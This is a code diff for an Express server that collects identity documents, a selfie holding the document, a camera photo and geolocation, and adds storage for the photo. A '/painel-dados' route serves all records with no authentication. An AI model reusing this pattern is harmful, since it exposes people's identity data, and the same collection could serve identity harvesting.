@@ -3,20 +3,27 @@ const multer = require("multer");
 const mysql = require("mysql2");
 const path = require("path");
 const cors = require("cors");
+const fs = require("fs");
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 
 // Middleware
 app.use(cors());
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.json({ limit: "10mb" })); // aumenta limite para base64 grande
+app.use(express.urlencoded({ extended: true, limit: "10mb" }));
+
+// garante que a pasta uploads existe
+const uploadDir = path.join(__dirname, "uploads");
+if (!fs.existsSync(uploadDir)) {
+  fs.mkdirSync(uploadDir);
+}
 
 // Servir arquivos estáticos da pasta public
 app.use(express.static(path.join(__dirname, "public")));
 
 // Servir uploads
-app.use("/uploads", express.static(path.join(__dirname, "uploads")));
+app.use("/uploads", express.static(uploadDir));
 
 // Conexão com FreeSQLDatabase
 const db = mysql.createConnection({
@@ -67,33 +74,34 @@ app.post(
       const carteira = req.files["carteira"] ? "/uploads/" + req.files["carteira"][0].filename : null;
       const selfieDoc = req.files["selfieDoc"] ? "/uploads/" + req.files["selfieDoc"][0].filename : null;
 
-const sql = `
-  INSERT INTO cadastros 
-  (nome, email, telefone, documento, carteira, selfieDoc, localizacao, ip, cidade_ip, estado_ip, timestamp)
-  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())
-`;
-const values = [
-  nome,
-  email,
-  telefone,
-  documento,
-  carteira,
-  selfieDoc,
-  latitude && longitude ? `${latitude},${longitude}` : null,
-  null,
-  null,
-  null
-];
+      const sql = `
+        INSERT INTO cadastros 
+        (nome, email, telefone, documento, carteira, selfieDoc, fotoCamera, localizacao, ip, cidade_ip, estado_ip, timestamp)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, NOW())
+      `;
+      const values = [
+        nome,
+        email,
+        telefone,
+        documento,
+        carteira,
+        selfieDoc,
+        fotoCamera || null, // salva base64 direto no banco
+        latitude && longitude ? `${latitude},${longitude}` : null,
+        null, // ip
+        null, // cidade_ip
+        null  // estado_ip
+      ];
 
       db.query(sql, values, (err) => {
         if (err) {
-          console.error("❌ Erro ao inserir no banco:", err.message);
+          console.error("❌ Erro ao inserir no banco:", err);
           return res.status(500).json({ status: "erro", mensagem: "Falha ao salvar no banco" });
         }
         res.json({ status: "sucesso", mensagem: "Cadastro salvo com sucesso!" });
       });
     } catch (error) {
-      console.error("❌ Erro inesperado:", error.message);
+      console.error("❌ Erro inesperado:", error);
       res.status(500).json({ status: "erro", mensagem: "Erro interno no servidor" });
     }
   }
@@ -104,7 +112,7 @@ app.get("/painel-dados", (req, res) => {
   const sql = "SELECT * FROM cadastros ORDER BY timestamp DESC";
   db.query(sql, (err, results) => {
     if (err) {
-      console.error("❌ Erro ao buscar cadastros:", err.message);
+      console.error("❌ Erro ao buscar cadastros:", err);
       return res.status(500).json({ status: "erro", mensagem: "Falha ao buscar cadastros" });
     }
     res.json(results);
